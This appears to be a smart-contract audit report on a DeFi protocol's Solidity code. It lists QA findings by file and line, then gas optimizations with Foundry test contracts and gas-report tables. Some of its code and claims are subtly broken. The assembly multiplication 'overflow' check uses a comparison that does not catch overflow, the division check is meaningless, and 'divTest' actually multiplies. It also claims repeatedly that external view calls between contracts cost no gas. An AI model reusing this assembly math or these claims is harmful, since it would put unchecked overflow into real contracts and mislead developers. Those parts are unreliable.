testnet, it can't be deployed on mainnet. If it's on mainnet, you can't test it.  - L79 - When the targetUnderlying_ variable is created, it is never validated that it is != address(0), this is important, since otherwise when swapAll() is executed they would be burning WETH.   **contracts/tokenomics/KeeperGauge.sol** - L77 - The function requests an extra variable that is not requested. There is a comment that says to add it so that the compiler don't throw warnings.  **contracts/StakerVault.sol** - L156/157 - First it should be validated that the src has an amount to transfer and then check if it needs allowance or not.  - L185 - If a malicious address is approved and if the src wants to change the approve it has, the spender could front run it to spend that approve you have and end up with more allowance.  **contracts/tokenomics/InflationManager.sol** - L80/81 - In the mint() function of the minter contract it can only be executed by the deployer of the BkdToken contract. Therefore, there is not much benefit in mintRewards() being executed for any address that returns true in the modifieronlyGauge(). 
**RoleManager.sol** - L27/46/112/113 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  **AddressProvider.sol** - L64/71/98/102/176/185/199/241/242/260/270/295/296/325/428/434 - The require are too expensive, it would be saved using the Errors custom + if, instead of requires. Another option could be to use a private view function.  - L101/102/103/118/119/121/122/123 - The get calls to other contracts, being a view method, do not generate any cost, therefore, it would be less expensive not to create variables and call the getter directly.  **Controller.sol** - L49/50/51/66/69/71 - The get calls to other contracts, being a view method, do not generate any cost, therefore, it would be less expensive not to create variables and call the getter directly.  - L66 - A variable is created and gas is consumed to fill a variable that will only be used if the if in line 68 is true, since it is only used within the if, it should be created within the if.  **BkdToken.sol** - L31 - Gas can be saved if instead of a require an if is used, with the custom error already created.  **libraries/UncheckedMath.sol** - L7 - In the uncheckedInc() function, the gas could be further optimized, if instead of unchecked{a+1;} it was unchecked {++a;}  **contracts/RewardHandler.sol** - L63 - It is less expensive to validate that variable != 0, than to validate variable > 0.  **contracts/BkdLocker.sol** - L91/92/137/139/254/301 - It is less expensive to validate that variable != 0, than to validate variable > 0.  - L91/92/119/137/208 - Gas can be saved if instead of a require an if is used, with the custom error already created.  - L140/144 - --i is less expensive than i = i - 1;  - 150/151 - A newTotal variable is created, to only be used in one place, it is not necessary and gas could be saved by not doing it.  **contracts/tokenomics/FeeBurner.sol** - L117 - It is less expensive to validate that variable != 0, than to validate variable > 0.  **contracts/tokenomics/LpGauge.sol** - L59 - The if that validates: (amount <= 0) does not make much sense, since in uint there is no < 0, therefore the correct validation is: (amount == 0).  - L68/114 - The if that validates param > 0, could become less expensive if instead of >, a != is used.  - L111/115 - A currentRate variable is created, which is only used in one place, therefore it is not necessary and more gas is spent.  **contracts/tokenomics/VestedEscrowRevocable.sol** - L101 - The claim() function appears as nonReentrant, but there is no reason for reentrant to occur, since only a transferFrom is performed on line 146 at VestedEscrow.sol  - L97/98 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly.  - L103/104 - It is possible to create a variable in memory for revokedTime[msg.sender], in this way less gas would be used.  - L52/53/54 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  - L54 - In the revoke() function the storage treasury address is used multiple times, one way to save gas is to create a variable in memory.  **contracts/tokenomics/VestedEscrow.sol** - L83/84 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly. Gas is also saved if instead of > 0 we use != 0.  - L89 - It is not necessary for the function to be nonReentrant, since the transfers that occur are only in the rewardToken address that is set by the owner on deploy, so there shouldn't be a problem with reentry.   - L134/135/155/156/168/169 - It is not necessary to create a variable that will only be used once, it would save gas if it is used directly.  **contracts/utils/Preparable.sol** - L28/29/86/98/110/111 - The modifier generates a lot of gas cost, it would be less expensive to use an if with a custom error or a private view function.  **contracts/tokenomics/KeeperGauge.sol** - L59/98 - ++epoch uses less gas than epoch++;  - L39/78/82/126/140 - The requirements are very expensive, it could save gas if instead of a modifier it is an if with a custom error or a private view function.  - L140 - Gas is saved, if instead of totalClaimable > 0 you can use totalClaimable != 0.  **contracts/tokenomics/AmmGauge.sol** - L63 - It should be amount == 0, it doesn't make sense for amount to be <= 0, since it is uint256.  - L88/104/125/147 - Gas would be saved if instead of variable > 0 variable != 0 is used.  
# Gas Optimizations  The following sections detail the gas optimizations found throughout the codebase. Each optimization is documented with the setup, an explainer for the optimization, a gas report and line identifiers for each optimization across the codebase. For each section's gas report, the optimizer was turned on and set to 10000 runs. You can replicate any tests/gas reports by heading to [0xKitsune/gas-lab](https://github.com/0xKitsune/gas-lab) and cloning the repo. Then, simply copy/paste the contract examples from any section and run `forge test --gas-report`. You can also easily update the optimizer runs in the `foundry.toml`.  ---  ## Use assembly to hash instead of Solidity  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public view {         c0.solidityHash(2309349, 2304923409);         c1.assemblyHash(2309349, 2304923409);     } }  contract Contract0 {     function solidityHash(uint256 a, uint256 b) public view {         //unoptimized         keccak256(abi.encodePacked(a, b));     } }  contract Contract1 {     function assemblyHash(uint256 a, uint256 b) public view {         //optimized         assembly {             mstore(0x00, a)             mstore(0x20, b)             let hashedVal := keccak256(0x00, 0x40)         }     } } ```  ### Gas Report  ```js ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 36687              ┆ 214             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ solidityHash       ┆ 313             ┆ 313 ┆ 313    ┆ 313 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 31281              ┆ 186             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ assemblyHash       ┆ 231             ┆ 231 ┆ 231    ┆ 231 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ```  ### Lines  - InflationManager.sol:628  - InflationManager.sol:632  - InflationManager.sol:636  ---  ## `unchecked{++i}` instead of `i++` (or use assembly when applicable)  Use `++i` instead of `i++`. This is especially useful in for loops but this optimization can be used anywhere in your code. You can also use `unchecked{++i;}` for even more gas savings but this will not check to see if `i` overflows. For extra safety if you are worried about this, you can add a require statement after the loop checking if `i` is equal to the final incremented value. For best gas savings, use inline assembly, however this limits the functionality you can achieve. For example you cant use Solidity syntax to internally call your own contract within an assembly block and external calls must be done with the `call()` or `delegatecall()` instruction. However when applicable, inline assembly will save much more gas.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();     }      function testGas() public {         c0.iPlusPlus();         c1.plusPlusI();         c2.uncheckedPlusPlusI();         c3.safeUncheckedPlusPlusI();         c4.inlineAssemblyLoop();     } }  contract Contract0 {     //loop with i++     function iPlusPlus() public pure {         uint256 j = 0;         for (uint256 i; i < 10; i++) {             j++;         }     } }  contract Contract1 {     //loop with ++i     function plusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ++i) {             j++;         }     } }  contract Contract2 {     //loop with unchecked{++i}     function uncheckedPlusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }     } }  contract Contract3 {     //loop with unchecked{++i} with additional overflow check     function safeUncheckedPlusPlusI() public pure {         uint256 j = 0;         uint256 i = 0;         for (i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }          //check for overflow         assembly {             if lt(i, 10) {                 mstore(0x00, "loop overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //loop with inline assembly     function inlineAssemblyLoop() public pure {         assembly {             let j := 0              for {                 let i := 0             } lt(i, 10) {                 i := add(i, 0x01)             } {                 j := add(j, 0x01)             }         }     } }  ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract0 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37687              ┆ 219             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ iPlusPlus          ┆ 2039            ┆ 2039 ┆ 2039   ┆ 2039 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract1 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ plusPlusI          ┆ 1989            ┆ 1989 ┆ 1989   ┆ 1989 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract3 contract     ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost        ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 42693                  ┆ 244             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name          ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ safeUncheckedPlusPlusI ┆ 1355            ┆ 1355 ┆ 1355   ┆ 1355 ┆ 1       │ ╰────────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬──────┬────────┬──────┬─────────╮ │ Contract2 contract ┆                 ┆      ┆        ┆      ┆         │ ╞════════════════════╪═════════════════╪══════╪════════╪══════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 35887              ┆ 210             ┆      ┆        ┆      ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg  ┆ median ┆ max  ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ uncheckedPlusPlusI ┆ 1329            ┆ 1329 ┆ 1329   ┆ 1329 ┆ 1       │ ╰────────────────────┴─────────────────┴──────┴────────┴──────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 26881              ┆ 164             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ inlineAssemblyLoop ┆ 709             ┆ 709 ┆ 709    ┆ 709 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯  ```  ### Lines  - KeeperGauge.sol:59  - KeeperGauge.sol:98  ---  ## Use assembly for math (add, sub, mul, div)  Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;     Contract5 c5;     Contract6 c6;     Contract7 c7;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();         c5 = new Contract5();         c6 = new Contract6();         c7 = new Contract7();     }      function testGas() public {         c0.addTest(34598345, 100);         c1.addAssemblyTest(34598345, 100);         c2.subTest(34598345, 100);         c3.subAssemblyTest(34598345, 100);         c4.mulTest(34598345, 100);         c5.mulAssemblyTest(34598345, 100);         c6.divTest(34598345, 100);         c7.divAssemblyTest(34598345, 100);     } }  contract Contract0 {     //addition in Solidity     function addTest(uint256 a, uint256 b) public pure {         uint256 c = a + b;     } }  contract Contract1 {     //addition in assembly     function addAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := add(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract2 {     //subtraction in Solidity     function subTest(uint256 a, uint256 b) public pure {         uint256 c = a - b;     } }  contract Contract3 {     //subtraction in assembly     function subAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := sub(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //multiplication in Solidity     function mulTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract5 {     //multiplication in assembly     function mulAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := mul(a, b)              if lt(c, a) {                 mstore(0x00, "overflow")                 revert(0x00, 0x20)             }         }     } }  contract Contract6 {     //division in Solidity     function divTest(uint256 a, uint256 b) public pure {         uint256 c = a * b;     } }  contract Contract7 {     //division in assembly     function divAssemblyTest(uint256 a, uint256 b) public pure {         assembly {             let c := div(a, b)              if gt(c, a) {                 mstore(0x00, "underflow")                 revert(0x00, 0x20)             }         }     } }   ```  ### Gas Report  ```js  ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract0 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40493              ┆ 233             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addTest            ┆ 303             ┆ 303 ┆ 303    ┆ 303 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract1 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ addAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract2 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 40293              ┆ 232             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subTest            ┆ 300             ┆ 300 ┆ 300    ┆ 300 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract3 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37287              ┆ 217             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ subAssemblyTest    ┆ 263             ┆ 263 ┆ 263    ┆ 263 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract4 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract5 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 37087              ┆ 216             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ mulAssemblyTest    ┆ 265             ┆ 265 ┆ 265    ┆ 265 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract6 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    ┆ Deployment Size ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ 41893              ┆ 240             ┆     ┆        ┆     ┆         │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ Function Name      ┆ min             ┆ avg ┆ median ┆ max ┆ # calls │ ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ │ divTest            ┆ 325             ┆ 325 ┆ 325    ┆ 325 ┆ 1       │ ╰────────────────────┴─────────────────┴─────┴────────┴─────┴─────────╯ ╭────────────────────┬─────────────────┬─────┬────────┬─────┬─────────╮ │ Contract7 contract ┆                 ┆     ┆        ┆     ┆         │ ╞════════════════════╪═════════════════╪═════╪════════╪═════╪═════════╡ │ Deployment Cost    